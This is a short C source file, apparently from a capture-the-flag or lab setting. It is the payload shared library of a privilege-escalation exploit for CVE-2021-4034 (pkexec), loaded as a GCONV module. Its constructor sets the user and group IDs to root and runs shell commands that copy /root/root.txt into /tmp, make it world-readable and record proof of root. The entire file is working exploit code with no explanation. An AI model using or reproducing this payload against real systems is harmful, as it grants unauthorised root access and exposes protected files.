// CVE-2021-4034 payload shared library
// Loaded as a GCONV module by pkexec with root privileges
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    setuid(0);
    setgid(0);
    system("cp /root/root.txt /tmp/r00t.txt 2>/dev/null; chmod 644 /tmp/r00t.txt 2>/dev/null; id > /tmp/pwned.txt; chmod 644 /tmp/pwned.txt");
}
